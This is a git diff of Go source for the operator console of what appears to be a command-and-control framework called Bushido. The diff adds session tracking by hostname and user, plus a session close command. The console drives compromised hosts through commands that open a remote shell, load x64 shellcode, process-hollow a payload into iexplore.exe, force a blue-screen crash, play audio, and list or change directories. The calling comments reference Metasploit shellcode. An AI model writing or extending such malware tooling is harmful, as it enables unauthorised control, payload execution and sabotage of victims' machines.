@@ -7,6 +7,7 @@ import (
 	"net"
 	"os"
 	"regexp"
+	"strconv"
 	"strings"
 	"time"
 )
@@ -17,7 +18,7 @@ func NewSessionList() *SessionList {
 	}
 }
 
-func (ll *SessionList) registerSession(port string, conn net.Conn) {
+func (ll *SessionList) registerSession(port string, hostname string, user string, conn net.Conn) {
 	check := true
 	var id int
 	for check {
@@ -26,10 +27,12 @@ func (ll *SessionList) registerSession(port string, conn net.Conn) {
 	}
 	// Create a new Session struct
 	newSession := &Session{
-		id:     id,
-		Port:   port,
-		Status: "Active",
-		Conn:   conn,
+		id:       id,
+		Port:     port,
+		Status:   "Active",
+		Hostname: hostname,
+		User:     user,
+		Conn:     conn,
 	}
 	// Add to the head of the linked list
 	newSession.Next = ll.Head
@@ -42,8 +45,9 @@ func authSession(conn *net.Conn) bool {
 	(*conn).Write([]byte("AreYouAlive\n"))
 	n, err := (*conn).Read(auth)
 	if err != nil {
-		fmt.Println("[-]Error reading from connection:", err)
+		fmt.Println() //Put this here for aesthetic reasons. Will use a go routine kill signal later to exit from handleclient proper
 		fmt.Println()
+		fmt.Println("[-]Error reading from connection:", err)
 		return false
 	}
 	if n <= 1 {
@@ -64,9 +68,9 @@ func authSession(conn *net.Conn) bool {
 	return true
 }
 
-// displaySessions displays the active sessions
+// Displays the active sessions
 func (ll *SessionList) displaySessions() {
-	fmt.Println("\nActive Sessions:")
+	fmt.Println("\n[!]Active Sessions:")
 	current := ll.Head
 	for current != nil {
 		fmt.Println("[+]SessionID:", current.id, "- Port:", current.Port, "- Status:", current.Status)
@@ -99,7 +103,30 @@ func (ll *SessionList) checkIfSessionIDExist(id int) bool {
 	return false //After itterating through all of the list return that it dont exist
 }
 
-func (ll *SessionList) closeSessions() {
+func (ll *SessionList) displaySessionInfo(id int) {
+	if ll.Head == nil {
+		return
+	}
+	current := ll.Head
+	for current != nil {
+		if current.id == id {
+			idStr := strconv.Itoa(current.id)
+			fmt.Println()
+			fmt.Println("[!]Session Info Found !")
+			fmt.Println("[+]ID: " + idStr)
+			fmt.Print("[+]Hostname: " + current.Hostname) //New line is present within the hostname. Will remove it later
+			fmt.Println("[+]User: " + current.User)       //New line also is present here wtf windows ?!
+			return
+		}
+		current = current.Next
+	}
+	fmt.Println()
+	fmt.Println("[-]Couldn't get session info ")
+	fmt.Println()
+	//After itterating through all of the list return that it dont exist
+}
+
+func (ll *SessionList) closeAllSessions() {
 	fmt.Println()
 	current := ll.Head
 	for current != nil {
@@ -113,98 +140,134 @@ func (ll *SessionList) closeSessions() {
 	ll.Head = nil // Reset the listener list
 }
 
-func openSession(id int, sl *SessionList) {
-	current := sl.Head
+func (ll *SessionList) closeSession(id int) { //Will delete as well
+	current := ll.Head
 	if current == nil {
-		fmt.Println("\n[-]Session not found\n")
 		return
 	}
-	for current.id != id && current != nil {
-		current = current.Next
-		if current == nil {
-			fmt.Println("\n[-]Session not found\n")
-			return
-		}
-	}
-	fmt.Println("\n[!]Session Found !")
-	fmt.Println("[+]Connecting ...")
-	if !authSession(&current.Conn) {
+	if current.id == id {
+		current.Conn.Close()
+		ll.Head = current.Next
+		//current = nil
 		return
 	}
-	fmt.Println("[+]BUSHIDO Shell Open ...\n")
-	reader := bufio.NewReader(os.Stdin)
-
-	for {
-		fmt.Print("BU$H1D0-1 >> ")
-		command, err := reader.ReadString('\n')
-		if err != nil {
-			fmt.Println("Error reading input:", err)
-			continue
-		} //Check how to make this prettier
-		command = strings.TrimSpace(command)
-		playRegex := regexp.MustCompile(`play .+`)
-		playMatch := playRegex.FindString(command)
-		loadRegex := regexp.MustCompile(`load .+`)
-		loadMatch := loadRegex.FindString(command)
-		cdRegex := regexp.MustCompile(`cd .+`)
-		cdMatch := cdRegex.FindString(command)
-		hollowRegex := regexp.MustCompile(`hollow .+ .+`)
-		hollowMatch := hollowRegex.FindString(command)
-		if cdMatch != "" {
-			dir2go := strings.Split(command, " ")[1]
-			cd(&current.Conn, dir2go)
-		}
-		if playMatch != "" {
-			audioFile := strings.Split(command, " ")[1]
-			playAudio(&current.Conn, audioFile)
-		}
-		if loadMatch != "" {
-			binFile := strings.Split(command, " ")[1]
-			load(&current.Conn, binFile)
-		}
-		if hollowMatch != "" {
-			filePathLocal := strings.Split(command, " ")[1]
-			//filePathTarget := strings.Split(command, " ")[2]
-			filePathTarget := strings.Split(command, "\"")[1]
-			//filePathTarget = "\"" + filePathTarget + "\"" //Not the sexiest fix but will do for now
+	prev := current
+	current = current.Next
+	for current != nil {
+		if current.id == id {
 			fmt.Println()
-			fmt.Println("[!]Local File Path: " + filePathLocal)
-			fmt.Println("[!]Remote File Path: " + filePathTarget)
-			hollow(&current.Conn, filePathLocal, filePathTarget) //hollow /home/hummus/Git/Dev/Go/Demolitron_C2/Bushido/msf.bin "C:\\Program Files\\Internet Explorer\\iexplore.exe"
-		}
-		switch command { //All of the functions called below will be found under bushido.go
-		case "shell":
-			shell(&current.Conn)
-		case "hostinfo":
-			hostinfo(&current.Conn)
-		case "bsod": //Refine it a bit more
-			if bsod(&current.Conn) {
-				fmt.Println("[!]HOST BSOD !")
-				fmt.Println("[?]Impliment Feature where the session is removed from the list when this happens")
-				return
-			} else {
-				fmt.Println("[-]Couldn't BSOD the Host ...")
-			}
-		case "bg":
+			fmt.Println("[!]Session Found !")
+			fmt.Println("[+]Closing Session " + strconv.Itoa(current.id))
+			current.Conn.Close()
+			prev.Next = current.Next
+			//current = nil
+			fmt.Println("[+]Succesfully Ended the Session")
+			fmt.Println()
 			return
-		case "exit":
-			return
-		case "play": //The audio thing only works if the device is not a VM
-			fmt.Println("[?]Usage: play <fileNameInAudio>")
-			//playAudio(&current.Conn, "BombPlanted.mp3") //Test Case. Plays but not fully.
-		case "load": //Works nicely but only with x64 payloads so be careful !!! //TO-DO add a prompt to exit if shit gets real
-			fmt.Println("[?]Usage: play <x64ShellcodeFile>")
-			//load(&current.Conn, "msf.bin") //Test Case. Success
-		case "cd":
-			fmt.Println("[?]Usage: cd <dir>") //Works with relative and absolute paths
-		case "ls":
-			ls(&current.Conn)
-		case "pwd":
-			pwd(&current.Conn)
-		case "hollow":
-			fmt.Println("[?]Usage: hollow <pathToExeLocal> <\"path2ExeRemote\">")
-			fmt.Println("[?]Windows paths should have double backslashes as such: \"C:\\Progarm Files\\Internet Explorer\\iexplore.exe\"")
-		default:
 		}
+		prev = current
+		current = current.Next
 	}
+	fmt.Println()
+	fmt.Println("[-]Session not found")
+	fmt.Println()
+}
+
+func openSession(id int, ll *SessionList) {
+	current := ll.Head
+	if current == nil {
+		fmt.Println()
+		fmt.Println("\n[-]Session not found")
+		fmt.Println()
+		return
+	}
+	for current != nil {
+		if current.id == id {
+			fmt.Println("\n[!]Session Found !")
+			fmt.Println("[!]Connecting ...")
+			if !authSession(&current.Conn) {
+				return
+			}
+			fmt.Println("[+]BUSHIDO Shell Open ...\n")
+			reader := bufio.NewReader(os.Stdin)
+
+			for {
+				fmt.Print("BU$H1D0-1 >> ")
+				command, err := reader.ReadString('\n')
+				if err != nil {
+					fmt.Println("[-]Error reading input:", err)
+					continue
+				} //Check how to make this prettier
+				command = strings.TrimSpace(command)
+				//playRegex := regexp.MustCompile(`play .+`)
+				//playMatch := playRegex.FindString(command)
+				loadRegex := regexp.MustCompile(`load .+`)
+				loadMatch := loadRegex.FindString(command)
+				cdRegex := regexp.MustCompile(`cd .+`)
+				cdMatch := cdRegex.FindString(command)
+				hollowRegex := regexp.MustCompile(`hollow .+ .+`)
+				hollowMatch := hollowRegex.FindString(command)
+				if cdMatch != "" {
+					dir2go := strings.Split(command, " ")[1]
+					cd(&current.Conn, dir2go)
+				}
+				// if playMatch != "" {//Not happy with this one
+				// 	audioFile := strings.Split(command, " ")[1]
+				// 	playAudio(&current.Conn, audioFile)
+				// }
+				if loadMatch != "" {
+					binFile := strings.Split(command, " ")[1]
+					load(&current.Conn, binFile)
+				}
+				if hollowMatch != "" {
+					filePathLocal := strings.Split(command, " ")[1]
+					//filePathTarget := strings.Split(command, " ")[2]
+					filePathTarget := strings.Split(command, "\"")[1]
+					//filePathTarget = "\"" + filePathTarget + "\"" //Not the sexiest fix but will do for now
+					fmt.Println()
+					fmt.Println("[!]Local File Path: " + filePathLocal)
+					fmt.Println("[!]Remote File Path: " + filePathTarget)
+					hollow(&current.Conn, filePathLocal, filePathTarget) //hollow /home/hummus/Git/Dev/Go/Demolitron_C2/Bushido/msf.bin "C:\\Program Files\\Internet Explorer\\iexplore.exe"
+				}
+				switch command { //All of the functions called below will be found under bushido.go
+				case "shell":
+					shell(&current.Conn)
+				case "hostinfo":
+					ll.displaySessionInfo(current.id)
+				case "bsod": //Refine it a bit more
+					if bsod(&current.Conn) {
+						fmt.Println("[!]HOST BSOD !")
+						fmt.Println("[?]Impliment Feature where the session is removed from the list when this happens")
+						return
+					} else {
+						fmt.Println("[-]Couldn't BSOD the Host ...")
+					}
+				case "bg":
+					return
+				case "exit":
+					return
+				case "play": //The audio thing only works if the device is not a VM
+					fmt.Println("[?]Usage: play <fileNameInAudio>")
+					//playAudio(&current.Conn, "BombPlanted.mp3") //Test Case. Plays but not fully.
+				case "load": //Works nicely but only with x64 payloads so be careful !!! //TO-DO add a prompt to exit if shit gets real
+					fmt.Println("[?]Usage: play <x64ShellcodeFile>")
+					//load(&current.Conn, "msf.bin") //Test Case. Success
+				case "cd":
+					fmt.Println("[?]Usage: cd <dir>") //Works with relative and absolute paths
+				case "ls":
+					ls(&current.Conn)
+				case "pwd":
+					pwd(&current.Conn)
+				case "hollow":
+					fmt.Println("[?]Usage: hollow <pathToExeLocal> <\"path2ExeRemote\">")
+					fmt.Println("[?]Windows paths should have double backslashes as such: \"C:\\Progarm Files\\Internet Explorer\\iexplore.exe\"")
+				default:
+				}
+			}
+		}
+		current = current.Next
+	}
+	fmt.Println()
+	fmt.Println("[-]Session not found")
+	fmt.Println()
 }
